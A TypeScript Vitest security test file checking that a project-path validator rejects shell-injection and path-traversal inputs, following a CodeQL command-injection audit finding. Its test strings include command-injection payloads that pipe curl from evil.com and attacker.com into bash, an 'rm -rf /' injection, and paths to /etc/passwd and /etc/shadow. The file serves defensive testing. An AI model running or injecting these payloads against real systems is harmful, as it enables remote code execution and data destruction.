/**
 * Security tests for runner.ts path validation — ATK-B1 (CodeQL js/command-line-injection)
 *
 * Verifies that projectPath validation rejects:
 * - Shell metacharacters (double-quote RCE vector, backticks, $, |, &, ;, \r, \n)
 * - Null bytes
 * - Paths that resolve outside ABSORB_PROJECT_ROOT
 * - Path traversal sequences
 *
 * And accepts valid paths that are within the allowed root.
 */

import { describe, expect, it, vi, beforeEach, afterEach } from 'vitest';
import * as path from 'path';
import * as os from 'os';
import { validateProjectPath } from './runner.js';

describe('validateProjectPath — ATK-B1 defense', () => {
  const originalEnv = process.env.ABSORB_PROJECT_ROOT;

  beforeEach(() => {
    // Reset env between tests
    delete process.env.ABSORB_PROJECT_ROOT;
  });

  afterEach(() => {
    // Restore original env
    if (originalEnv !== undefined) {
      process.env.ABSORB_PROJECT_ROOT = originalEnv;
    } else {
      delete process.env.ABSORB_PROJECT_ROOT;
    }
  });

  // --- Double-quote rejection (primary RCE vector from ATK-B1) ---

  it('rejects projectPath containing a double-quote character', () => {
    expect(() =>
      validateProjectPath('/tmp/legit" && curl http://evil.com | bash && echo "')
    ).toThrow(/shell metacharacters/);
  });

  it('rejects projectPath with double-quote at the start', () => {
    expect(() => validateProjectPath('"/etc/passwd')).toThrow(/shell metacharacters/);
  });

  it('rejects projectPath with double-quote at the end', () => {
    expect(() => validateProjectPath('/tmp/project"')).toThrow(/shell metacharacters/);
  });

  // --- Other shell metacharacter rejection ---

  it('rejects projectPath containing backtick', () => {
    expect(() => validateProjectPath('/tmp/`whoami`')).toThrow(/shell metacharacters/);
  });

  it('rejects projectPath containing dollar sign', () => {
    expect(() => validateProjectPath('/tmp/$HOME/project')).toThrow(/shell metacharacters/);
  });

  it('rejects projectPath containing pipe', () => {
    expect(() => validateProjectPath('/tmp/legit | rm -rf /')).toThrow(/shell metacharacters/);
  });

  it('rejects projectPath containing ampersand', () => {
    expect(() => validateProjectPath('/tmp/legit && whoami')).toThrow(/shell metacharacters/);
  });

  it('rejects projectPath containing semicolon', () => {
    expect(() => validateProjectPath('/tmp/legit;whoami')).toThrow(/shell metacharacters/);
  });

  it('rejects projectPath containing carriage return', () => {
    expect(() => validateProjectPath('/tmp/legit\rwhoami')).toThrow(/shell metacharacters/);
  });

  it('rejects projectPath containing newline', () => {
    expect(() => validateProjectPath('/tmp/legit\nwhoami')).toThrow(/shell metacharacters/);
  });

  // --- Null byte rejection ---

  it('rejects projectPath containing null byte', () => {
    expect(() => validateProjectPath('/tmp/legit\0evil')).toThrow(/null byte/);
  });

  // --- Path traversal rejection ---

  it('rejects projectPath with .. that resolves outside allowed root', () => {
    // Without ABSORB_PROJECT_ROOT set, default root is the daemon temp dir.
    // A path like /etc/passwd will be outside that root.
    expect(() => validateProjectPath('/etc/passwd')).toThrow(/outside allowed root/);
  });

  // --- ABSORB_PROJECT_ROOT prefix check ---

  it('accepts a path that resolves within ABSORB_PROJECT_ROOT', () => {
    const allowedRoot = path.join(os.tmpdir(), 'test-absorb-root');
    process.env.ABSORB_PROJECT_ROOT = allowedRoot;
    // A path inside the allowed root should be accepted
    const validPath = path.join(allowedRoot, 'my-project');
    const result = validateProjectPath(validPath);
    expect(result).toBe(path.resolve(validPath));
  });

  it('rejects a path that resolves outside ABSORB_PROJECT_ROOT', () => {
    const allowedRoot = path.join(os.tmpdir(), 'test-absorb-root');
    process.env.ABSORB_PROJECT_ROOT = allowedRoot;
    expect(() => validateProjectPath('/etc/shadow')).toThrow(/outside allowed root/);
  });

  it('rejects path traversal that escapes ABSORB_PROJECT_ROOT', () => {
    const allowedRoot = path.join(os.tmpdir(), 'test-absorb-root');
    process.env.ABSORB_PROJECT_ROOT = allowedRoot;
    // Even though path.resolve handles .., the resulting resolved path
    // should still be inside the allowed root
    const attackPath = path.join(allowedRoot, '..', '..', 'etc', 'passwd');
    expect(() => validateProjectPath(attackPath)).toThrow(/outside allowed root/);
  });

  it('accepts the ABSORB_PROJECT_ROOT directory itself', () => {
    const allowedRoot = path.join(os.tmpdir(), 'test-absorb-root');
    process.env.ABSORB_PROJECT_ROOT = allowedRoot;
    const result = validateProjectPath(allowedRoot);
    expect(result).toBe(path.resolve(allowedRoot));
  });

  // --- Default allowed root (no ABSORB_PROJECT_ROOT set) ---

  it('uses system temp dir as default allowed root when ABSORB_PROJECT_ROOT is unset', () => {
    // Without ABSORB_PROJECT_ROOT, the default root is os.tmpdir()/holoscript-daemon
    // A path inside that should be accepted
    const defaultRoot = path.join(os.tmpdir(), 'holoscript-daemon');
    const validPath = path.join(defaultRoot, 'project-123');
    const result = validateProjectPath(validPath);
    expect(result).toBe(path.resolve(validPath));
  });

  it('rejects path outside default allowed root when ABSORB_PROJECT_ROOT is unset', () => {
    // /etc/passwd is outside any tmpdir-based root
    expect(() => validateProjectPath('/etc/passwd')).toThrow(/outside allowed root/);
  });

  // --- Valid paths that should be accepted ---

  it('accepts a normal path within allowed root', () => {
    const allowedRoot = path.join(os.tmpdir(), 'test-absorb-root');
    process.env.ABSORB_PROJECT_ROOT = allowedRoot;
    const validPath = path.join(allowedRoot, 'my-project', 'src');
    const result = validateProjectPath(validPath);
    expect(result).toBe(path.resolve(validPath));
  });

  it('accepts a path with spaces in directory name', () => {
    const allowedRoot = path.join(os.tmpdir(), 'test-absorb-root');
    process.env.ABSORB_PROJECT_ROOT = allowedRoot;
    const validPath = path.join(allowedRoot, 'my project', 'src');
    const result = validateProjectPath(validPath);
    expect(result).toBe(path.resolve(validPath));
  });

  it('accepts a path with hyphens and underscores', () => {
    const allowedRoot = path.join(os.tmpdir(), 'test-absorb-root');
    process.env.ABSORB_PROJECT_ROOT = allowedRoot;
    const validPath = path.join(allowedRoot, 'my_project-v2', 'src');
    const result = validateProjectPath(validPath);
    expect(result).toBe(path.resolve(validPath));
  });

  // --- Edge cases ---

  it('rejects empty string path', () => {
    // Empty string resolves to cwd, which is unlikely to be inside the allowed root
    expect(() => validateProjectPath('')).toThrow();
  });

  it('rejects the ATK-B1 attack payload exactly as documented', () => {
    // Exact payload from security audit:
    // /tmp/legit" && curl http://attacker.com/shell.sh | bash && echo "
    expect(() =>
      validateProjectPath('/tmp/legit" && curl http://attacker.com/shell.sh | bash && echo "')
    ).toThrow(/shell metacharacters/);
  });
});